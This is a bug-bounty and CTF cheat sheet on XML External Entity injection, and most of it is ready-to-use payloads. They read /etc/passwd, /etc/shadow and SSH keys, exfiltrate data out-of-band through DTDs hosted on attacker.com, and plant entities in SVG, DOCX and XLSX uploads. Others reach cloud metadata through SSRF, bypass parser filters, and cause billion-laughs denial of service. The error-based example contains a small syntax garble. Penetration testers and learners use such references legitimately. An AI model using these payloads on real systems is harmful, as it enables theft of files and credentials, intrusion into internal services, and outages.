# XXE (XML EXTERNAL ENTITY) — COMPLETE BUG BOUNTY REFERENCE
> Source: PortSwigger Web Security Academy + PayloadsAllTheThings
> For: Bug bounty hunting, CTF, and security assessments

---

## 1. CONCEPTS

### What is XXE?
XML External Entity injection occurs when XML input containing a reference to an external entity is processed by a weakly configured XML parser. This can lead to:
- **File read** (local files)
- **SSRF** (internal services)
- **DoS** (billion laughs attack)
- **RCE** (via file upload, SSRF chains)

### Why XXE Happens
- XML parser allows external entities by default
- Input is XML-based (SOAP, RSS, SVG, DOCX/XLSX, PDF generation)
- No disable of DTD processing or external entities

---

## 2. TYPES OF XXE

### 2.1 Classic (In-Band) XXE
Server returns the entity content in the response:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<stockCheck>
  <productId>&xxe;</productId>
</stockCheck>
```

### 2.2 Blind XXE (Out-of-Band)
Server doesn't return entity content. Exfiltrate via:
```xml
<!-- Step 1: Trigger XXE that references attacker server -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<stockCheck>
  <productId>123</productId>
</stockCheck>

<!-- Step 2: evil.dtd on attacker server -->
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % param "<!ENTITY exfil SYSTEM 'http://attacker.com/?data=%data;'>">
%param;
```

### 2.3 Blind XXE via Error Messages
```xml
<!-- Inject malformed entity that leaks data via error -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY & errors file SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
]>
<stockCheck>1</stockCheck>

<!-- Server error: "File not found: /nonexistent/root:x:0:0..." -->
```

### 2.4 XInclude Attack
When you can't modify DOCTYPE, use XInclude:
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

### 2.5 Parameter Entity XXE
```xml
<!-- Parameter entities are resolved inside DTD -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/param.dtd">
  %xxe;
]>
<data>1</data>

<!-- param.dtd -->
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % param "<!ENTITY exfil SYSTEM 'http://attacker.com/?%data;'>">
%param;
```

---

## 3. XXE VIA FILE UPLOAD

### SVG XXE
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

### DOCX XXE
```bash
# 1. Unzip document.docx
mkdir docx_extract && cd docx_extract
unzip ../document.docx

# 2. Edit word/document.xml — add DOCTYPE
# Add after <?xml version="1.0"?> line:
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
# Replace a word with &xxe;

# 3. Repackage
zip -r ../malicious.docx *

# 4. Upload
```

### XLSX XXE
```bash
# Same process as DOCX
# Edit xl/sharedStrings.xml
# Add DOCTYPE: <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
# Replace a cell value with &xxe;
```

### PPTX XXE
```bash
# Edit ppt/slides/slide1.xml
# Add DOCTYPE and &xxe; in a text element
```

### PDF XXE
```xml
<!-- HTML input to PDF converter -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<html>
  <body>
    <p>&xxe;</p>
  </body>
</html>
```

---

## 4. XXE IN COMMON FORMATS

### SOAP
```xml
POST /api/soap HTTP/1.1
Content-Type: text/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <getUser>
      <userId>&xxe;</userId>
    </getUser>
  </soap:Body>
</soap:Envelope>
```

### RSS Feed Import
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<rss version="2.0">
  <channel>
    <title>&xxe;</title>
    <link>http://example.com</link>
    <description>&xxe;</description>
  </channel>
</rss>
```

### SVG with OOB Exfiltration
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/svg-xxe.dtd">
  %dtd;
]>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <text>&send;</text>
</svg>

<!-- svg-xxe.dtd -->
<!ENTITY % param "<!ENTITY send SYSTEM 'http://attacker.com/?data=%file;'>">
%param;
```

---

## 5. FILE READ PAYLOADS

### Basic File Read
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<root>&xxe;</root>
```

### File Read by Language
```bash
# Linux
file:///etc/passwd
file:///etc/shadow
file:///etc/hosts
file:///proc/self/environ
file:///proc/self/cmdline
file:///proc/net/tcp
file:///home/user/.bash_history
file:///home/user/.ssh/id_rsa
file:///var/log/apache2/access.log

# Windows
file:///c:/windows/win.ini
file:///c:/windows/system32/drivers/etc/hosts
file:///c:/inetpub/wwwroot/web.config

# PHP Base64 filter
php://filter/convert.base64-encode/resource=index.php
php://filter/convert.base64-encode/resource=../config/database.php

# Java
file:///proc/self/fd/0
file:///proc/self/fd/1

# .NET
file:///c:/windows/win.ini
file:///c:/inetpub/web.config
```

### PHP Source Code Disclosure
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=config.php"> ]>
<root>&xxe;</root>
<!-- Decode base64 response to get PHP source -->
```

---

## 6. SSRF VIA XXE

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal-server/admin"> ]>
<root>&xxe;</root>

<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"> ]>
<root>&xxe;</root>
```

---

## 7. BYPASS TECHNIQUES

### When External Entities Blocked
```xml
<!-- Try parameter entities instead -->
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
```

### When DOCTYPE Blocked
```xml
<!-- Use XInclude -->
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>

<!-- Or SVG XInclude -->
<svg xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</svg>
```

### When Standard Entities Blocked
```xml
<!-- Try different encoding -->
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd" encoding="UTF-8"> ]>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd" encoding="ISO-8859-1"> ]>
```

### Language-Specific Tricks
```bash
# Java
jar:http://attacker.com/evil.jar!/file.txt
expect://id
```

---

## 8. DETECTION METHODOLOGY

### Step-by-Step
1. **Identify XML input** — Upload forms accepting XML, SVG, DOCX/XLSX, SOAP, RSS
2. **Test basic XXE** — Send with external entity referencing Burp Collaborator
3. **Check response** — Does entity value appear? = In-band XXE
4. **If no response** — Use OOB with Burp Collaborator
5. **Test file read** — /etc/passwd, /etc/hosts, Windows files
6. **Test SSRF** — Internal IPs, cloud metadata
7. **Test XInclude** — When DOCTYPE modification not possible
8. **Check for blind** — Error-based exfiltration
9. **Chain** — XXE + file upload, XXE + SSRF to RCE

### Entry Points
```bash
- File upload: SVG, DOCX, XLSX, PPTX, PDF
- API endpoints accepting XML
- SOAP web services
- RSS feed importers
- PDF generators (HTML to PDF)
- Image processors (SVG handling)
- Content management systems
- XML-based config imports
```

### Indicators
- XML parsing error messages in response
- Different responses with vs without entity reference
- Burp Collaborator interaction
- Error messages revealing file content
- Slow responses (DoS / large file read)

---

## 9. DoS PAYLOADS

### Billion Laughs
```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
<data>&lol4;</data>
```

### Entity Expansion Bomb
```xml
<?xml version="1.0"?>
<!DOCTYPE bomb [
  <!ENTITY a "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa">
  <!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">
  <!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">
]>
<data>&c;</data>
```

---

## 10. TOOLS

| Tool | Purpose |
|------|---------|
| Burp Suite | Intercept XML requests, test XXE |
| XXEinjector | Automated XXE exploitation |
| PHP XXE Scanner | PHP-specific XXE detection |
| DTD Extractor | Extract DTD from target |

---

*Last updated: 2026-09-03*
*Sources: PortSwigger Academy, PayloadsAllTheThings, HackTricks*
